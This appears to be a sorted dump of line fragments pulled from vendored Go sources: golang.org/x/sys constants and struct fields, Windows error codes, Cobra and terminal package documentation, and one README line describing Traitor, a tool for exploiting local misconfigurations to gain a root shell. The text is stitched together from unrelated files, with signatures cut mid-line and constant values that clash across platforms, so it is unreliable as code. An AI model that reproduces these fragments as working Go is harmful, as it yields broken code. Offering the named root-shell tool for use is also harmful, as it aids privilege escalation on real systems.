TYPE_E_BUFFERTOOSMALL                                                     Handle        = 0x80028016
TYPE_E_CANTCREATETMPFILE                                                  Handle        = 0x80028CA3
TYPE_E_CANTLOADLIBRARY                                                    Handle        = 0x80029C4A
TYPE_E_CIRCULARTYPE                                                       Handle        = 0x80029C84
TYPE_E_DLLFUNCTIONNOTFOUND                                                Handle        = 0x8002802F
TYPE_E_DUPLICATEID                                                        Handle        = 0x800288C6
TYPE_E_ELEMENTNOTFOUND                                                    Handle        = 0x8002802B
TYPE_E_FIELDNOTFOUND                                                      Handle        = 0x80028017
TYPE_E_INCONSISTENTPROPFUNCS                                              Handle        = 0x80029C83
TYPE_E_INVALIDID                                                          Handle        = 0x800288CF
TYPE_E_INVALIDSTATE                                                       Handle        = 0x80028029
TYPE_E_INVDATAREAD                                                        Handle        = 0x80028018
TYPE_E_IOERROR                                                            Handle        = 0x80028CA2
TYPE_E_LIBNOTREGISTERED                                                   Handle        = 0x8002801D
TYPE_E_NAMECONFLICT                                                       Handle        = 0x8002802D
TYPE_E_OUTOFBOUNDS                                                        Handle        = 0x80028CA1
TYPE_E_QUALIFIEDNAMEDISALLOWED                                            Handle        = 0x80028028
TYPE_E_REGISTRYACCESS                                                     Handle        = 0x8002801C
TYPE_E_SIZETOOBIG                                                         Handle        = 0x800288C5
TYPE_E_TYPEMISMATCH                                                       Handle        = 0x80028CA0
TYPE_E_UNDEFINEDTYPE                                                      Handle        = 0x80028027
TYPE_E_UNKNOWNLCID                                                        Handle        = 0x8002802E
TYPE_E_UNSUPFORMAT                                                        Handle        = 0x80028019
TYPE_E_WRONGTYPEKIND                                                      Handle        = 0x8002802A
Table    uint8
Tableid  uint16
Tableid uint16
TagId            uint32
Tags []string 
Tai       int32
Tail       uintptr
TailLength uint32
Target   
TargetIdx      uint32
TargetIdx   uint32
Target_count uint32
Target_idx       uint32
Target_idx   uint32
Target_type  [16]byte
Tdev    int32
Tdname       [20]int8
Terminal {
Terminal) SetBracketedPasteMode(on bool) {
Terminal) SetPrompt(prompt string) {
Terminal) addKeyToLine(key rune) {
Terminal) advanceCursor(places int) {
Terminal) clearAndRepaintLinePlusNPrevious(numPrevLines int) {
Terminal) clearLineToRight() {
Terminal) countToLeftWord() int {
Terminal) countToRightWord() int {
Terminal) eraseNPreviousChars(n int) {
Terminal) moveCursorToPos(pos int) {
Terminal) queue(data []rune) {
Terminal) writeLine(line []rune) {
Terminal{
Termio) error {
Termios) (err error) = SYS_TCGETATTR
Termios) (err error) = SYS_TCSETATTR
Termios) (err error) {
Termios) error {
Termios.
Testinfo_len uint32
Tfree  int32
Tfree  int64
Thank you so much for contributing to Cobra. We appreciate your time and help.
The 
The OS specific files for the new build system are located in the 
The above copyright notice and this permission notice shall
The above copyright notice and this permission notice shall be included in all
The arguments are indexed from 0 through flag.NArg()-1.
The bash completion script generated by Cobra requires the 
The currently supported shells are:
The default set of command-line flags is controlled by
The easiest way to install is to run 
The error can then be caught at the execute function call.
The error numbers and strings are generated from 
The example above prints an Active Help message when not enough information was given by the user to complete the 
The first and second are the standard ones
The following output is automatically generated by Cobra. Nothing beyond the
The following validators are built in:
The generated completion script should be put somewhere in your 
The gophers there will answer or ask you to file an issue if you've tripped over a bug.
The hand-written assembly file at 
The hardest part about preparing this file is figuring out which headers to
The latter two will also apply to any children commands.
The legacy solution allows you to inject bash functions into the bash completion script.  Those bash functions are responsible for providing the completion choices for your own completions.
The library exposes a single interface:
The main issue tracker for the term repository is located at
The merge is performed in the following steps:
The mksyscall.go program takes the 
The new build system uses a Docker container to generate the go files directly
The old build system generates the Go files based on the C header files
The output of coloured/formatted text is easy using the following syntax:
The pattern to follow is
The script is designed to support all three PowerShell completion modes:
The sys/unix package provides access to the raw system call interface of the
The uuid package generates and inspects UUIDs based on
The way to configure Active Help is to use the program's Active Help environment
Then you can simply pipe text containing tags to tml:
There are currently two ways we generate the necessary files. We are currently
There are helper functions available to get the value stored in a Flag if you have a FlagSet but find
There are two different approaches to assign a flag.
There is one exception to this: if you directly instantiate the Flag struct
They must be called from within the docker container.
This application is a tool to generate the needed files
This command does not take any more arguments
This is a command line tool.
This is being done on an OS-by-OS basis. Please update this documentation as
This is free and unencumbered software released into the public domain.
This package is based on the github.com/pborman/uuid package (previously named
This repository provides Go terminal and console support packages.
This repository uses Gerrit for code changes. To learn how to submit changes to
This script depends on the 'bash-completion' package.
This script is used to generate the system's various constants. This doesn't
This section describes the various files used in the code generation process.
Thrashing_count           uint64
Thrashing_delay_total     uint64
Thread    Handle
ThreadEntry32) (err error)
ThreadEntry32) (err error) {
ThreadID       uint32
ThreadId  uint32
Threads         uint32
Tick      int32
Tick      int64
Tick    int32
Tick   int32
TickCountDeadline uint32
Tickadj int32
Tid       uint32
Time      Timeval
Time     uint32
Time    RTCTime
Time [3]uint32
Time(t 
TimeDateStamp      uint32
TimeStamp uint32
Time_cycles    uint64
Time_enabled   uint64
Time_mask      uint64
Time_mult      uint32
Time_offset    uint64
Time_running   uint64
Time_shift     uint16
Time_zero      uint64
Timeo int16
Timeout PPSKTime
Timeout uint32
Timeout: time.Second 
Times(tms 
Timespec
Timespec) (
Timespec) (err error)
Timespec) (err error) {
Timespec) Nano() int64 {
Timespec) error {
Timeval) (err error)
Timeval) (err error) {
Timeval) (err error) { return syscall.EWINDOWS }
Timeval) (err syscall.Errno)
Timeval) (err syscall.Errno) {
Timeval) Nano() int64 {
Timeval) Nanoseconds() int64 {
Timeval) error {
Timezone) (err error)
Timezone) (err error) {
Timout int32
Tinode uint32
Tinode uint64
Title         
Tnpc   uint64
To limit completions of flag values to directory names 
To limit completions of flag values to directory names you can either use the 
To limit completions of flag values to file names with certain extensions you can either use the different 
To load completions in your current shell session:
To load completions:
To manually implement Cobra you need to create a bare main.go file and a rootCmd file.
To tell Cobra 
To tell Cobra to completely disable descriptions for completions:
To_priv uint32
Token) (err error) = advapi32.DuplicateTokenEx
Token) (err error) = advapi32.OpenProcessToken
Token) (err error) = advapi32.OpenThreadToken
Token) (err error) = wtsapi32.WTSQueryUserToken
Token) (err error) {
TokenAccessInformation
TokenAuditPolicy
TokenDefaultDacl
TokenElevation
TokenElevationType
TokenGroups
TokenGroupsAndPrivileges
TokenHasRestrictions
TokenImpersonation = 2
TokenImpersonationLevel
TokenIntegrityLevel
TokenLinkedToken
TokenLogonSid
TokenMandatoryPolicy
TokenOrigin
TokenOwner
TokenPrimary       = 1
TokenPrimaryGroup
TokenPrivileges
TokenRestrictedSids
TokenSandBoxInert
TokenSessionId
TokenSessionReference
TokenSource
TokenStatistics
TokenType
TokenUIAccess
TokenUser = 1 
TokenVirtualizationAllowed
TokenVirtualizationEnabled
Tokengroups) AllGroups() []SIDAndAttributes {
Tokenmandatorylabel) Size() uint32 {
Tokenprivileges) AllPrivileges() []LUIDAndAttributes {
Tolerance int32
Tolerance int64
Top    int16
Tos      uint8
Total_retrans  uint32
Totalhigh uint32
Totalhigh uint64
Totalram  uint32
Totalram  uint64
Totalswap uint32
Totalswap uint64
Tp  uint64
TpacketReq) error {
TpacketReq3) error {
Tpc    uint64
Tpgid   int32
Tq           uint32
TrackFlags        uint32
Track_bytes    uint16
Traitor packages up a bunch of methods to exploit local misconfigurations and vulnerabilities in order to pop a root shell:
TranslateName(accName 
Transport: 
Trap      uint32
Trap      uint64
Trapno    uint32
Trapno uint32
Traps              int32
TraverseChildren bool
TrsEuc         uint16
Trseuc         uint16
TrustListInfo              
TrustStatus                CertTrustStatus
TrustStatus       CertTrustStatus
Trustee           TRUSTEE
TrusteeForm              TRUSTEE_FORM
TrusteeType              TRUSTEE_TYPE
TrusteeValue             TrusteeValue
Ts [3]Timespec
Ts_first_pkt        TpacketBDTS
Ts_last_pkt         TpacketBDTS
Tseg1_max uint32
Tseg1_min uint32
Tseg2_max uint32
Tseg2_min uint32
Tsess   uintptr
Tstamp    BpfTimeval
Tstamp   uint32
Tstamp  BpfTimeval
Tstamp  Timeval
Tstamp  Timeval32
Tstate uint64
Ttl      uint32
Tx XDPRingOffset
TxID    uint32
Tx_invalid_descs         uint64
Tx_ring_empty_descs      uint64
Txbytes             uint64
Txerr uint16
Txpackets           uint64
Txretransmitbytes   uint64
Txretransmitpackets uint64
Txtflag uint16 // aggregating Txflag:1 deferred:1 rsvflags:14
Type                      [64]int8
Type                      [64]uint8
Type                uint32
Type               uint32
Type              uint32
Type            [64]int8
Type            [64]uint8
Type            uint32
Type          [64]int8
Type          [64]uint8
Type         [64]int8
Type         [64]uint8
Type         uint8
Type        [64]int8
Type        [64]uint8
Type        int32
Type        uint32
Type        uint8
Type       [64]int8
Type       [64]uint8
Type       uint8
Type      [64]int8
Type      [64]uint8
Type      int32
Type      uint8
Type     [64]int8
Type     [64]uint8
Type     uint16
Type     uint32
Type     uint8
Type    int32
Type    int64
Type    string
Type    uint16
Type    uint32
Type    uint8
Type   [14]uint8
Type   int16
Type   uint16
Type   uint32
Type   uint8
Type  int32
Type  uint16
Type  uint32
Type [64]int8
Type [64]uint8
Type uint16
Type uint16 // server type
Type uint32
Type uint8  // the type of the file (plan9.QTDIR for example)
Type() string
Type: 
Typelen    uint8
U    [32]byte
UBI_IOCATT                       = 0x40186f40
UBI_IOCATT                       = 0x80186f40
UBI_IOCDET                       = 0x40046f41
UBI_IOCDET                       = 0x80046f41
UBI_IOCEBCH                      = 0x40044f02
UBI_IOCEBCH                      = 0x80044f02
UBI_IOCEBER                      = 0x40044f01
UBI_IOCEBER                      = 0x80044f01
UBI_IOCEBISMAP                   = 0x40044f05
UBI_IOCEBISMAP                   = 0x80044f05
UBI_IOCEBMAP                     = 0x40084f03
UBI_IOCEBMAP                     = 0x80084f03
UBI_IOCEBUNMAP                   = 0x40044f04
UBI_IOCEBUNMAP                   = 0x80044f04
UBI_IOCMKVOL                     = 0x40986f00
UBI_IOCMKVOL                     = 0x80986f00
UBI_IOCRMVOL                     = 0x40046f01
UBI_IOCRMVOL                     = 0x80046f01
UBI_IOCRNVOL                     = 0x51106f03
UBI_IOCRNVOL                     = 0x91106f03
UBI_IOCRPEB                      = 0x40046f04
UBI_IOCRPEB                      = 0x80046f04
UBI_IOCRSVOL                     = 0x400c6f02
UBI_IOCRSVOL                     = 0x800c6f02
UBI_IOCSETVOLPROP                = 0x40104f06
UBI_IOCSETVOLPROP                = 0x80104f06
UBI_IOCSPEB                      = 0x40046f05
UBI_IOCSPEB                      = 0x80046f05
UBI_IOCVOLCRBLK                  = 0x40804f07
UBI_IOCVOLCRBLK                  = 0x80804f07
UBI_IOCVOLRMBLK                  = 0x20004f08
UBI_IOCVOLRMBLK                  = 0x4f08
UBI_IOCVOLUP                     = 0x40084f00
UBI_IOCVOLUP                     = 0x80084f00
UBI_IOC[A-Z]/ 
UCEERR_BLOCKSFULL                                                         Handle        = 0x88980409
UCEERR_CHANNELSYNCABANDONED                                               Handle        = 0x88980414
UCEERR_CHANNELSYNCTIMEDOUT                                                Handle        = 0x88980413
UCEERR_COMMANDTRANSPORTDENIED                                             Handle        = 0x88980418
UCEERR_CONNECTIONIDLOOKUPFAILED                                           Handle        = 0x88980408
UCEERR_CTXSTACKFRSTTARGETNULL                                             Handle        = 0x88980407
UCEERR_FEEDBACK_UNSUPPORTED                                               Handle        = 0x88980417
UCEERR_GRAPHICSSTREAMALREADYOPEN                                          Handle        = 0x88980420
UCEERR_GRAPHICSSTREAMUNAVAILABLE                                          Handle        = 0x88980419
UCEERR_HANDLELOOKUPFAILED                                                 Handle        = 0x88980405
UCEERR_ILLEGALHANDLE                                                      Handle        = 0x88980404
UCEERR_ILLEGALPACKET                                                      Handle        = 0x88980402
UCEERR_ILLEGALRECORDTYPE                                                  Handle        = 0x8898040C
UCEERR_INVALIDPACKETHEADER                                                Handle        = 0x88980400
UCEERR_MALFORMEDPACKET                                                    Handle        = 0x88980403
UCEERR_MEMORYFAILURE                                                      Handle        = 0x8898040A
UCEERR_MISSINGBEGINCOMMAND                                                Handle        = 0x88980412
UCEERR_MISSINGENDCOMMAND                                                  Handle        = 0x88980411
UCEERR_NO_MULTIPLE_WORKER_THREADS                                         Handle        = 0x8898040F
UCEERR_OUTOFHANDLES                                                       Handle        = 0x8898040D
UCEERR_PACKETRECORDOUTOFRANGE                                             Handle        = 0x8898040B
UCEERR_PARTITION_ZOMBIED                                                  Handle        = 0x88980423
UCEERR_REMOTINGNOTSUPPORTED                                               Handle        = 0x88980410
UCEERR_RENDERTHREADFAILURE                                                Handle        = 0x88980406
UCEERR_TRANSPORTDISCONNECTED                                              Handle        = 0x88980421
UCEERR_TRANSPORTOVERLOADED                                                Handle        = 0x88980422
UCEERR_TRANSPORTUNAVAILABLE                                               Handle        = 0x88980416
UCEERR_UNCHANGABLE_UPDATE_ATTEMPTED                                       Handle        = 0x8898040E
UCEERR_UNKNOWNPACKET                                                      Handle        = 0x88980401
UCEERR_UNSUPPORTEDTRANSPORTVERSION                                        Handle        = 0x88980415
UCLC
UDF_SUPER_MAGIC                             = 0x15013346
UIChoice                        uint32
UIContext                       uint32
UIRestrictionsClass uint32
UI_E_AMBIGUOUS_MATCH                                                      Handle        = 0x802A000A
UI_E_BOOLEAN_EXPECTED                                                     Handle        = 0x802A0008
UI_E_CREATE_FAILED                                                        Handle        = 0x802A0001
UI_E_DIFFERENT_OWNER                                                      Handle        = 0x802A0009
UI_E_END_KEYFRAME_NOT_DETERMINED                                          Handle        = 0x802A0104
UI_E_FP_OVERFLOW                                                          Handle        = 0x802A000B
UI_E_ILLEGAL_REENTRANCY                                                   Handle        = 0x802A0003
UI_E_INVALID_DIMENSION                                                    Handle        = 0x802A010B
UI_E_INVALID_OUTPUT                                                       Handle        = 0x802A0007
UI_E_LOOPS_OVERLAP                                                        Handle        = 0x802A0105
UI_E_OBJECT_SEALED                                                        Handle        = 0x802A0004
UI_E_PRIMITIVE_OUT_OF_BOUNDS                                              Handle        = 0x802A010C
UI_E_SHUTDOWN_CALLED                                                      Handle        = 0x802A0002
UI_E_START_KEYFRAME_AFTER_END                                             Handle        = 0x802A0103
UI_E_STORYBOARD_ACTIVE                                                    Handle        = 0x802A0101
UI_E_STORYBOARD_NOT_PLAYING                                               Handle        = 0x802A0102
UI_E_TIMER_CLIENT_ALREADY_CONNECTED                                       Handle        = 0x802A010A
UI_E_TIME_BEFORE_LAST_UPDATE                                              Handle        = 0x802A0109
UI_E_TRANSITION_ALREADY_USED                                              Handle        = 0x802A0106
UI_E_TRANSITION_ECLIPSED                                                  Handle        = 0x802A0108
UI_E_TRANSITION_NOT_IN_STORYBOARD                                         Handle        = 0x802A0107
UI_E_VALUE_NOT_DETERMINED                                                 Handle        = 0x802A0006
UI_E_VALUE_NOT_SET                                                        Handle        = 0x802A0005
UI_E_WINDOW_CLOSED                                                        Handle        = 0x802A0201
UI_E_WRONG_THREAD                                                         Handle        = 0x802A000C
UMOUNT)_/ 
UMOUNT_NOFOLLOW                             = 0x8
UN)$/ 
UNLKPT  = (int32('P') << 8) 
UNMOUNTED          = 0x20000000
UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000
UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000
URLReference                    
URLRetrievalTimeout          uint32
USAGE_MATCH_TYPE_AND = 0
USAGE_MATCH_TYPE_OR  = 1
USBDEVICE_SUPER_MAGIC                       = 0x9fa2
USER)/ 
UTC_E_ACTION_NOT_SUPPORTED_IN_DESTINATION                                 Handle        = 0x87C51044
UTC_E_AGENT_DIAGNOSTICS_TOO_LARGE                                         Handle        = 0x87C51055
UTC_E_ALTERNATIVE_TRACE_CANNOT_PREEMPT                                    Handle        = 0x87C51002
UTC_E_AOT_NOT_RUNNING                                                     Handle        = 0x87C51003
UTC_E_API_BUSY                                                            Handle        = 0x87C5102B
UTC_E_API_NOT_SUPPORTED                                                   Handle        = 0x87C5103C
UTC_E_API_RESULT_UNAVAILABLE                                              Handle        = 0x87C51028
UTC_E_BINARY_MISSING                                                      Handle        = 0x87C51034
UTC_E_CANNOT_LOAD_SCENARIO_EDITOR_XML                                     Handle        = 0x87C5101F
UTC_E_CERT_REV_FAILED                                                     Handle        = 0x87C5103F
UTC_E_CHILD_PROCESS_FAILED                                                Handle        = 0x87C5101D
UTC_E_COMMAND_LINE_NOT_AUTHORIZED                                         Handle        = 0x87C5101E
UTC_E_DELAY_TERMINATED                                                    Handle        = 0x87C51025
UTC_E_DEVICE_TICKET_ERROR                                                 Handle        = 0x87C51026
UTC_E_DIAGRULES_SCHEMAVERSION_MISMATCH                                    Handle        = 0x87C5100A
UTC_E_ESCALATION_ALREADY_RUNNING                                          Handle        = 0x87C5100F
UTC_E_ESCALATION_CANCELLED_AT_SHUTDOWN                                    Handle        = 0x87C5105A
UTC_E_ESCALATION_DIRECTORY_ALREADY_EXISTS                                 Handle        = 0x87C5102F
UTC_E_ESCALATION_NOT_AUTHORIZED                                           Handle        = 0x87C5101B
UTC_E_ESCALATION_TIMED_OUT                                                Handle        = 0x87C51020
UTC_E_EVENTLOG_ENTRY_MALFORMED                                            Handle        = 0x87C51009
UTC_E_EXCLUSIVITY_NOT_AVAILABLE                                           Handle        = 0x87C5102D
UTC_E_EXE_TERMINATED                                                      Handle        = 0x87C5101A
UTC_E_FAILED_TO_RECEIVE_AGENT_DIAGNOSTICS                                 Handle        = 0x87C51056
UTC_E_FAILED_TO_RESOLVE_CONTAINER_ID                                      Handle        = 0x87C51036
UTC_E_FAILED_TO_START_NDISCAP                                             Handle        = 0x87C51040
UTC_E_FILTER_FUNCTION_RESTRICTED                                          Handle        = 0x87C51048
UTC_E_FILTER_ILLEGAL_EVAL                                                 Handle        = 0x87C51053
UTC_E_FILTER_INVALID_COMMAND                                              Handle        = 0x87C51052
UTC_E_FILTER_INVALID_FUNCTION                                             Handle        = 0x87C51050
UTC_E_FILTER_INVALID_FUNCTION_PARAMS                                      Handle        = 0x87C51051
UTC_E_FILTER_INVALID_TYPE                                                 Handle        = 0x87C51046
UTC_E_FILTER_MISSING_ATTRIBUTE                                            Handle        = 0x87C51045
UTC_E_FILTER_VARIABLE_NOT_FOUND                                           Handle        = 0x87C51047
UTC_E_FILTER_VERSION_MISMATCH                                             Handle        = 0x87C51049
UTC_E_FORWARDER_ALREADY_DISABLED                                          Handle        = 0x87C51008
UTC_E_FORWARDER_ALREADY_ENABLED                                           Handle        = 0x87C51007
UTC_E_FORWARDER_PRODUCER_MISMATCH                                         Handle        = 0x87C51012
UTC_E_GETFILEINFOACTION_FILE_NOT_APPROVED                                 Handle        = 0x87C5105B
UTC_E_GETFILE_EXTERNAL_PATH_NOT_APPROVED                                  Handle        = 0x87C5103D
UTC_E_GETFILE_FILE_PATH_NOT_APPROVED                                      Handle        = 0x87C5102E
UTC_E_INSUFFICIENT_SPACE_TO_START_TRACE                                   Handle        = 0x87C51059
UTC_E_INTENTIONAL_SCRIPT_FAILURE                                          Handle        = 0x87C51013
UTC_E_INVALID_AGGREGATION_STRUCT                                          Handle        = 0x87C51043
UTC_E_INVALID_CUSTOM_FILTER                                               Handle        = 0x87C5100C
UTC_E_INVALID_FILTER                                                      Handle        = 0x87C51019
UTC_E_KERNELDUMP_LIMIT_REACHED                                            Handle        = 0x87C51041
UTC_E_MISSING_AGGREGATE_EVENT_TAG                                         Handle        = 0x87C51042
UTC_E_MULTIPLE_TIME_TRIGGER_ON_SINGLE_STATE                               Handle        = 0x87C51033
UTC_E_NETWORK_CAPTURE_NOT_ALLOWED                                         Handle        = 0x87C51035
UTC_E_NO_WER_LOGGER_SUPPORTED                                             Handle        = 0x87C51015
UTC_E_PERFTRACK_ALREADY_TRACING                                           Handle        = 0x87C51010
UTC_E_REACHED_MAX_ESCALATIONS                                             Handle        = 0x87C51011
UTC_E_REESCALATED_TOO_QUICKLY                                             Handle        = 0x87C5100E
UTC_E_RPC_TIMEOUT                                                         Handle        = 0x87C51029
UTC_E_RPC_WAIT_FAILED                                                     Handle        = 0x87C5102A
UTC_E_SCENARIODEF_NOT_FOUND                                               Handle        = 0x87C51005
UTC_E_SCENARIODEF_SCHEMAVERSION_MISMATCH                                  Handle        = 0x87C51018
UTC_E_SCENARIO_HAS_NO_ACTIONS                                             Handle        = 0x87C51057
UTC_E_SCENARIO_THROTTLED                                                  Handle        = 0x87C5103B
UTC_E_SCRIPT_MISSING                                                      Handle        = 0x87C5103A
UTC_E_SCRIPT_TERMINATED                                                   Handle        = 0x87C5100B
UTC_E_SCRIPT_TYPE_INVALID                                                 Handle        = 0x87C51004
UTC_E_SETREGKEYACTION_TYPE_NOT_APPROVED                                   Handle        = 0x87C5105C
UTC_E_SETUP_NOT_AUTHORIZED                                                Handle        = 0x87C5101C
UTC_E_SETUP_TIMED_OUT                                                     Handle        = 0x87C51021
UTC_E_SIF_NOT_SUPPORTED                                                   Handle        = 0x87C51024
UTC_E_SQM_INIT_FAILED                                                     Handle        = 0x87C51014
UTC_E_THROTTLED                                                           Handle        = 0x87C51038
UTC_E_TIME_TRIGGER_INVALID_TIME_RANGE                                     Handle        = 0x87C51032
UTC_E_TIME_TRIGGER_ONLY_VALID_ON_SINGLE_TRANSITION                        Handle        = 0x87C51031
UTC_E_TIME_TRIGGER_ON_START_INVALID                                       Handle        = 0x87C51030
UTC_E_TOGGLE_TRACE_STARTED                                                Handle        = 0x87C51001
UTC_E_TRACEPROFILE_NOT_FOUND                                              Handle        = 0x87C51006
UTC_E_TRACERS_DONT_EXIST                                                  Handle        = 0x87C51016
UTC_E_TRACE_BUFFER_LIMIT_EXCEEDED                                         Handle        = 0x87C51027
UTC_E_TRACE_MIN_DURATION_REQUIREMENT_NOT_MET                              Handle        = 0x87C5102C
UTC_E_TRACE_NOT_RUNNING                                                   Handle        = 0x87C5100D
UTC_E_TRIGGER_MISMATCH                                                    Handle        = 0x87C51022
UTC_E_TRIGGER_NOT_FOUND                                                   Handle        = 0x87C51023
UTC_E_TRY_GET_SCENARIO_TIMEOUT_EXCEEDED                                   Handle        = 0x87C5103E
UTC_E_TTTRACER_RETURNED_ERROR                                             Handle        = 0x87C51054
UTC_E_TTTRACER_STORAGE_FULL                                               Handle        = 0x87C51058
UTC_E_UNABLE_TO_RESOLVE_SESSION                                           Handle        = 0x87C51037
UTC_E_UNAPPROVED_SCRIPT                                                   Handle        = 0x87C51039
UTC_E_WINRT_INIT_FAILED                                                   Handle        = 0x87C51017
UTF8)$/ 
UTIME_/ 
UTIME_NOW                                   = 0x3fffffff
UTIME_NOW                         = -0x1
UTIME_NOW                         = -0x2
UTIME_NOW                      = -0x1
UTIME_NOW                     = -0x1
UTIME_NOW                     = -0x2
UTIME_OMIT                                  = 0x3ffffffe
UTIME_OMIT                        = -0x1
UTIME_OMIT                        = -0x2
UTIME_OMIT                     = -0x2
UTIME_OMIT                    = -0x2
UTIME_OMIT                    = -0x3
UUID  UUID
UUID) Scan(src interface{}) error {
UUID) UnmarshalBinary(data []byte) error {
UUID) UnmarshalText(data []byte) error {
Ucred   Ucred
Ucred) []byte {
Ucred)(h.data(0)) = 
Ucred)(unsafe.Pointer(
Udata  
Udata     int32
Udata     int64
Udata  int32
Uid             uint32
Uid            uint32
Uid          int32
Uid        uint32
Uid       uint32
Uid      uint32
Uid     uint32
Uid    string // owner name
Uid    uint32
Uid  uint32
Uid uint32
Umask(mask int) (oldmask int)
Umask(newmask int) (oldmask int)
Un              [16]byte
Unacked        uint32
Uname(buf 
Undelete(path string) (err error)
Uninterruptible uint64
UnionChoice                     uint32
UniqueProcessID              uintptr
UniqueProcessId              uintptr
UniqueProcessKey             
Unit      uint32
Unit uint32
UnknownFlags bool
Unlink(path string) (err error)
Unlink(path string) (err error) = SYS___UNLINK_A
UnmapViewOfFile(addr uintptr) (err error)
Unshare(flags int) (err error)
UnsubscribeServiceChangeNotifications(subscription uintptr) = sechost.UnsubscribeServiceChangeNotifications
Unused   uint16
Unused  uint16
Unused01           int32
Unused05           int32
Unused06           int32
Unused07           int32
Unused08           int32
Unused09           int32
Unused1    uint8
Unused1 uint8
Unused11           int32
Unused12           int32
Unused13           int32
Unused2    uint32
Unused2 uint32
UnusedBits uint32
UnwindData   uint32
Upper uint32
Uptime    int32
Uptime    int64
Uregs [18]uint32
Usage               string              // help message
Usage           uint32
Usage          uint32
Usage CertEnhKeyUsage
Usage func()
Usage()
Usage:
Usage:{{if .Runnable}}
UsageIdentifier        
UsageIdentifiers 
Use       int32
Use     int32
Use string
Usec      int32
Usec    uint32
Usec int32
Usec int64
Usec uint32
Usedspace   uint64
Useecc   uint32
User   
User           
User SIDAndAttributes
UserID string
UserLength     uint32
UserName        string
UserTime                     int64
UserTime     Filetime
User_count   uint32
User_gen   uint32
User_id [8]int8
User_stack  
Useraudit    uint32
Userns_fd   uint64
UsrComment 
Ustat_t) (err error)
Ustat_t) (err error) {
Utimbuf) (err error)
Utimbuf) (err error) = SYS___UTIME_A
Utimbuf) (err error) {
Utimbuf) error {
Utime     uint64
Utime    Timeval
Utime  int32
Utime  int64
Utime  uint32
Utime timeval_zos
Utsname) (err error)
Utsname) (err error) = SYS___UNAME_A
Utsname) (err error) {
Utsname) error {
Uuid         [129]byte
V9FS_MAGIC                                  = 0x1021997
VALID_INHERIT_FLAGS                = 0x1F
VCEOF                         = 0x8
VCEOL                         = 0x9
VCHECKPT                          = 0x13
VDISCARD                                = 0xf
VDISCARD                          = 0xf
VDISCARD                         = 0x10
VDISCARD                         = 0xd
VDISCARD                       = 0xf
VDISCARD                      = 0xd
VDISCRD                       = 0xc
VDSUSP                                  = 0xb
VDSUSP                            = 0xb
VDSUSP                         = 0xb
VDSUSP                        = 0xa
VDSUSP                        = 0xb
VEOF                                    = 0x0
VEOF                              = 0x0
VEOF                             = 0x10
VEOF                             = 0x4
VEOF                            = 4
VEOF                           = 0x0
VEOF                          = 0x4
VEOL                                    = 0x1
VEOL                              = 0x1
VEOL                             = 0x11
VEOL                             = 0x6
VEOL                             = 0xb
VEOL                            = 5
VEOL                           = 0x1
VEOL                          = 0x5
VEOL2                                   = 0x2
VEOL2                             = 0x2
VEOL2                            = 0x10
VEOL2                            = 0x6
VEOL2                            = 0x8
VEOL2                          = 0x2
VEOL2                         = 0x6
VERASE                                      = 0x2
VERASE                                  = 0x3
VERASE                            = 0x3
VERASE                          = 2
VERASE                         = 0x3
VERASE                        = 0x2
VERASE2                           = 0x7
VERASE2                        = 0x7
VERASE2                       = 0x11
VERITY
VERSION)$/ 
VFUOCP1a
VIEW_E_DRAW                                                               Handle        = 0x80040140
VIEW_E_FIRST                                                              syscall.Errno = 0x80040140
VIEW_E_LAST                                                               syscall.Errno = 0x8004014F
VIEW_S_ALREADY_FROZEN                                                     Handle        = 0x00040140
VIEW_S_FIRST                                                              syscall.Errno = 0x00040140
VIEW_S_LAST                                                               syscall.Errno = 0x0004014F
VINTR                                       = 0x0
VINTR                                   = 0x8
VINTR                             = 0x8
VINTR                           = 0
VINTR                          = 0x8
VINTR                         = 0x0
VIRTUAL)$/ 
VKILL                                       = 0x3
VKILL                                   = 0x5
VKILL                             = 0x5
VKILL                           = 3
VKILL                          = 0x5
VKILL                         = 0x3
VLNEXT                                      = 0xf
VLNEXT                                  = 0xe
VLNEXT                            = 0xe
VLNEXT                         = 0xe
VLNEXT                        = 0xe
VLNEXT                        = 0xf
VMADDR)_/ 
VMADDR_CID_ANY                              = 0xffffffff
VMADDR_CID_ANY                          = 0xffffffff
VMADDR_CID_HOST                             = 0x2
VMADDR_CID_HOST                         = 0x2
VMADDR_CID_HYPERVISOR                       = 0x0
VMADDR_CID_HYPERVISOR                   = 0x0
VMADDR_CID_LOCAL                            = 0x1
VMADDR_CID_RESERVED                     = 0x1
VMADDR_FLAG_TO_HOST                         = 0x1
VMADDR_PORT_ANY                             = 0xffffffff
VMADDR_PORT_ANY                         = 0xffffffff
VMIN                                    = 0x10
VMIN                              = 0x10
VMIN                             = 0x4
VMIN                             = 0x5
VMIN                             = 0x6
VMIN                            = 6
VMIN                           = 0x10
VMIN                          = 0x4
VM_ANONMIN                        = 0x7
VM_BCACHE_SIZE_MAX                = 0x0
VM_BCACHE_SIZE_MAX             = 0x19000000
VM_BCACHE_SIZE_MAX             = 0x70e0000
VM_LOADAVG                              = 0x2
VM_LOADAVG                        = 0x2
VM_MACHFACTOR                           = 0x4
VM_MALLOC_CONF                    = 0xc
VM_MAXID                                = 0x6
VM_MAXID                          = 0xc
VM_MAXID                          = 0xd
VM_MAXSLP                         = 0xa
VM_METER                                = 0x1
VM_METER                          = 0x1
VM_NKMEMPAGES                     = 0x6
VM_PSSTRINGS                      = 0x3
VM_SOCKETS_INVALID_VERSION                  = 0xffffffff
VM_SWAPENCRYPT                    = 0x5
VM_SWAPUSAGE                            = 0x5
VM_SWZONE_SIZE_MAX                = 0x4000000000
VM_SWZONE_SIZE_MAX             = 0x2280000
VM_USPACE                         = 0xb
VM_UVMEXP                         = 0x4
VM_VNODEMIN                       = 0x9
VM_VTEXTMIN                       = 0x8
VQUIT                                       = 0x1
VQUIT                                   = 0x9
VQUIT                             = 0x9
VQUIT                           = 1
VQUIT                          = 0x9
VQUIT                         = 0x1
VREPRINT                                = 0x6
VREPRINT                          = 0x6
VREPRINT                         = 0xb
VREPRINT                         = 0xc
VREPRINT                       = 0x6
VREPRINT                      = 0xb
VREPRINT                      = 0xc
VSTART                                  = 0xc
VSTART                            = 0xc
VSTART                           = 0x8
VSTART                           = 0xd
VSTART                          = 7
VSTART                         = 0xc
VSTART                        = 0x7
VSTART                        = 0x8
VSTATUS                                 = 0x12
VSTATUS                           = 0x12
VSTATUS                        = 0x12
VSTATUS                       = 0x10
VSTOP                                   = 0xd
VSTOP                             = 0xd
VSTOP                            = 0x9
VSTOP                            = 0xe
VSTOP                           = 8
VSTOP                          = 0xd
VSTOP                         = 0x8
